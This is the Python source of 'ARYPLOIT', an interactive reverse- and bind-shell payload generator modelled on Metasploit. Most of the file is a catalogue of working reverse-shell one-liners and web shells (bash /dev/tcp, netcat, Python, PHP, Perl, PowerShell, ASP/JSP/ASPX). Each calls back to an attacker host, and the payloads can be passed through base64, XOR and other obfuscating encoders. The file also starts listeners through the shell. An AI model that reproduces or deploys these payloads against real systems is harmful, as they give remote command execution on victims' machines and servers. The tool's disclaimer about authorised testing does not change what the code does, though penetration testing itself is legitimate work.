#########################################
# Author: Aryan
# Copyright: 2025 Aryan
# GitHub: https://github.com/giriaryan694-a11y
# Note: Unauthorized copying without credit is prohibited
#########################################
import os
import sys
import pyfiglet
import base64
import urllib.parse
import binascii
import codecs
import subprocess
from termcolor import colored
from colorama import init

init(autoreset=True)

# Banner
def banner():
    print(colored(pyfiglet.figlet_format("ARYPLOIT"), "green"))
    print(colored("⚠ FOR EDUCATIONAL & AUTHORIZED TESTING ONLY ⚠", "red"))
    print(colored("Inspired by Metasploit - All-in-One Payload Generator", "yellow"))
    print(colored("Author: Aryan", "magenta"))
    print()

# Payloads
rev_payloads = {
    # Linux/Unix
    "linux/bash_tcp": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    "linux/bash_udp": "bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
    "linux/nc_traditional": "nc -e /bin/sh {LHOST} {LPORT}",
    "linux/nc_openbsd": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f",
    "linux/python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
    "linux/python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
    "linux/php": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "linux/perl": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "linux/ruby": "ruby -rsocket -e 'c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec \"/bin/sh -i\"'",
    "linux/java": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor();",
    "linux/socat": "socat TCP:{LHOST}:{LPORT} EXEC:\"/bin/sh\"",
    "linux/telnet": "rm -f /tmp/p; mknod /tmp/p p && telnet {LHOST} {LPORT} 0/tmp/p",
    "linux/openssl": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s",
    "linux/powershell": "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",

    # Windows
    "windows/cmd": "cmd.exe /c powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    "windows/powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String );$sendback2=$sendback+'PS ' + (pwd).Path + '> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    "windows/powershell_oneline": "$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    "windows/nc": "nc.exe -e cmd.exe {LHOST} {LPORT}",

    # Web
    "web/php": "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\");?>",
    "web/asp": "<% Execute(\"cmd.exe /c powershell -c '$client = New-Object System.Net.Sockets.TCPClient(\\\"{LHOST}\\\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\\"PS \\\" + (pwd).Path + \\\" > \\\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'\") %>",
    "web/jsp": "<% Runtime r = Runtime.getRuntime(); Process p = r.exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\"); p.waitFor(); %>",
    "web/aspx": "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c powershell -c '$client = New-Object System.Net.Sockets.TCPClient(\\\"{LHOST}\\\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\\"PS \\\" + (pwd).Path + \\\" > \\\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'\"); %>",
}

bind_payloads = {
    # Linux/Unix
    "linux/nc_traditional": "nc -lvnp {LPORT} -e /bin/bash",
    "linux/nc_openbsd": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp {LPORT} > /tmp/f",
    "linux/bash_tcp": "bash -i >& /dev/tcp/0.0.0.0/{LPORT} 0>&1",
    "linux/socat": "socat TCP-LISTEN:{LPORT},fork EXEC:/bin/bash",
    "linux/python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "linux/python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "linux/perl": "perl -e 'use Socket;$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);$c=accept(S,S);open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "linux/ruby": "ruby -rsocket -e 's=TCPServer.new(\"{LPORT}\");c=s.accept;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",c.fileno,c.fileno,c.fileno)'",
    "linux/java": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/0.0.0.0/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor();",

    # Windows
    "windows/nc": "nc -lvnp {LPORT} -e cmd.exe",
    "windows/powershell": "powershell -c \"$listener = [System.Net.Sockets.TcpListener]{LPORT};$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
}

encoders = {
    "base64": lambda s: base64.b64encode(s.encode()).decode(),
    "url": lambda s: urllib.parse.quote_plus(s),
    "hex": lambda s: binascii.hexlify(s.encode()).decode(),
    "rot13": lambda s: codecs.encode(s, 'rot13'),
    "xor": lambda s: ''.join([chr(ord(c) ^ 0x55) for c in s]),
    "reverse": lambda s: s[::-1],
    "caesar": lambda s: ''.join([chr(((ord(c) - ord('a') + 3) % 26) + ord('a')) if c.islower() else chr(((ord(c) - ord('A') + 3) % 26) + ord('A')) if c.isupper() else c for c in s]),
    "binary": lambda s: ' '.join(format(ord(c), '08b') for c in s),
    "oct": lambda s: ' '.join(format(ord(c), '03o') for c in s),
    "html": lambda s: ''.join(f"&#{ord(c)};" for c in s),
    "unicode": lambda s: ''.join(f"\\u{ord(c):04x}" for c in s),
    "none": lambda s: s,
}

listeners = {
    "nc": "nc -lvnp {LPORT}",
    "socat": "socat TCP-LISTEN:{LPORT},fork STDOUT",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
}

current_payload = None
current_type = None
current_encoder = None
LHOST = ""
LPORT = ""
encoder_chain = []
current_listener = None

def show_help():
    print(colored("Available commands:", "cyan"))
    print(colored("  list <type> [category] - List payloads, encoders, listeners", "yellow"))
    print(colored("  search payload <keyword> - Search payloads by keyword", "yellow"))
    print(colored("  search encoders <keyword> - Search encoders by keyword", "yellow"))
    print(colored("  use <type>/<payload_name> - Select a payload", "yellow"))
    print(colored("  set payload <type>/<payload_name> - Set payload", "yellow"))
    print(colored("  set lhost <ip>    - Set LHOST for reverse shell", "yellow"))
    print(colored("  set lport <port>  - Set LPORT", "yellow"))
    print(colored("  set listener <type> - Set listener type (nc, socat, python)", "yellow"))
    print(colored("  set encoder <encoder1,encoder2,...> - Set encoder(s)", "yellow"))
    print(colored("  generate          - Generate payload", "yellow"))
    print(colored("  run               - Start the listener", "yellow"))
    print(colored("  info              - Show info about payload", "yellow"))
    print(colored("  help              - Show this message", "yellow"))
    print(colored("  exit              - Exit tool", "yellow"))
    print()

def list_items(item_type, category=None):
    if item_type == "rev_payloads":
        for k in rev_payloads:
            if category and category in k:
                print(f"reverse/{k}")
            elif not category:
                print(f"reverse/{k}")
    elif item_type == "bind_payloads":
        for k in bind_payloads:
            if category and category in k:
                print(f"bind/{k}")
            elif not category:
                print(f"bind/{k}")
    elif item_type == "encoders":
        for e in encoders:
            print(e)
    elif item_type == "listeners":
        for l in listeners:
            print(l)
    else:
        print("Unknown type. Options: rev_payloads, bind_payloads, encoders, listeners")

def search_payloads(keyword):
    found = False
    for k in rev_payloads:
        if keyword.lower() in k.lower():
            print(f"reverse/{k}")
            found = True
    for k in bind_payloads:
        if keyword.lower() in k.lower():
            print(f"bind/{k}")
            found = True
    if not found:
        print(f"No payloads found matching '{keyword}'")

def search_encoders(keyword):
    found = False
    for e in encoders:
        if keyword.lower() in e.lower():
            print(e)
            found = True
    if not found:
        print(f"No encoders found matching '{keyword}'")

def apply_encoders(payload):
    for encoder in encoder_chain:
        if encoder in encoders:
            payload = encoders[encoder](payload)
    return payload

def generate_payload():
    global current_payload, current_type, LHOST, LPORT, encoder_chain
    if not current_payload or not current_type:
        print("Select a payload first with 'use <type>/<name>' or 'set payload <type>/<name>'")
        return
    if current_type == "reverse":
        if not LHOST or not LPORT:
            LHOST = input("LHOST > ")
            LPORT = input("LPORT > ")
    else:
        if not LPORT:
            LPORT = input("LPORT > ")
    payload = ""
    if current_type == "reverse":
        payload = rev_payloads[current_payload].format(LHOST=LHOST, LPORT=LPORT)
    else:
        payload = bind_payloads[current_payload].format(LPORT=LPORT)
        print(colored("\n[Info] Bind shells are useful when you can’t egress (target blocks outbound traffic).", "cyan"))
    if encoder_chain:
        payload = apply_encoders(payload)
    print(colored("Generated Payload:\n", "green"))
    print(payload)
    print()

def payload_info():
    global current_payload, current_type
    if not current_payload:
        print("No payload selected")
        return
    print(colored(f"Selected Payload: {current_type}/{current_payload}", "cyan"))

def show_listener(listener_type):
    global LPORT
    if listener_type in listeners:
        example = listeners[listener_type].format(LPORT=LPORT)
        print(colored(f"Listener Example ({listener_type}): {example}", "green"))
    else:
        print("Unknown listener type")

def run_listener():
    global current_listener, LPORT
    if not current_listener:
        print("Set a listener first with 'set listener <type>'")
        return
    if not LPORT:
        print("Set LPORT first with 'set lport <port>'")
        return
    listener_cmd = listeners[current_listener].format(LPORT=LPORT)
    print(colored(f"[+] Starting listener: {listener_cmd}", "green"))
    try:
        subprocess.Popen(listener_cmd, shell=True)
    except Exception as e:
        print(f"Failed to start listener: {e}")

def main():
    global current_payload, current_type, encoder_chain, LHOST, LPORT, current_listener
    banner()
    while True:
        try:
            cmd = input(colored("aryploit > ", "yellow")).strip().lower()
            if cmd.startswith("help"):
                show_help()
            elif cmd.startswith("list"):
                parts = cmd.split()
                if len(parts) > 1:
                    if len(parts) > 2:
                        list_items(parts[1], parts[2])
                    else:
                        list_items(parts[1])
                else:
                    print("Usage: list <type> [category]")
            elif cmd.startswith("search"):
                parts = cmd.split()
                if len(parts) > 2:
                    if parts[1] == "payload":
                        search_payloads(' '.join(parts[2:]))
                    elif parts[1] == "encoders":
                        search_encoders(' '.join(parts[2:]))
                    else:
                        print("Usage: search <payload/encoders> <keyword>")
                else:
                    print("Usage: search <payload/encoders> <keyword>")
            elif cmd.startswith("use"):
                parts = cmd.split()
                if len(parts) == 2 and "/" in parts[1]:
                    current_type, current_payload = parts[1].split("/", 1)
                    if current_type not in ["reverse", "bind"]:
                        print("Unknown payload type. Choose 'reverse' or 'bind'.")
                        current_payload = None
                    else:
                        print(colored(f"[+] Loaded payload: {current_type}/{current_payload}", "green"))
                else:
                    print("Usage: use <type>/<payload_name>")
            elif cmd.startswith("set"):
                parts = cmd.split()
                if len(parts) >= 3:
                    option = parts[1].lower()
                    value = ' '.join(parts[2:])
                    if option == "lhost":
                        LHOST = value
                        print(f"[+] LHOST set to: {LHOST}")
                    elif option == "lport":
                        LPORT = value
                        print(f"[+] LPORT set to: {LPORT}")
                    elif option == "encoder":
                        encoder_chain = [e.strip() for e in value.split(",")]
                        for encoder in encoder_chain:
                            if encoder not in encoders:
                                print(f"Unknown encoder: {encoder}. Available: {', '.join(encoders.keys())}")
                                encoder_chain = []
                                break
                        else:
                            print(f"[+] Encoder chain set: {', '.join(encoder_chain)}")
                    elif option == "listener":
                        if value in listeners:
                            current_listener = value
                            print(f"[+] Listener set to: {current_listener}")
                        else:
                            print(f"Unknown listener. Available: {', '.join(listeners.keys())}")
                    elif option == "payload":
                        if "/" in value:
                            current_type, current_payload = value.split("/", 1)
                            if current_type not in ["reverse", "bind"]:
                                print("Unknown payload type. Choose 'reverse' or 'bind'.")
                                current_payload = None
                            else:
                                print(colored(f"[+] Loaded payload: {current_type}/{current_payload}", "green"))
                        else:
                            print("Usage: set payload <type>/<payload_name>")
                    else:
                        print("Unknown set option. Available: lhost, lport, encoder, payload, listener")
                else:
                    print("Usage: set <option> <value>")
            elif cmd.startswith("generate"):
                generate_payload()
            elif cmd == "run":
                run_listener()
            elif cmd.startswith("info"):
                payload_info()
            elif cmd.startswith("listener"):
                parts = cmd.split()
                if len(parts) == 2:
                    show_listener(parts[1])
                else:
                    print("Usage: listener <type>")
            elif cmd == "exit":
                print("Bye!")
                sys.exit()
            else:
                print("[-] Unknown command. Type 'help' for commands.")
        except KeyboardInterrupt:
            print("\nBye!")
            sys.exit()

if __name__ == "__main__":
    main()
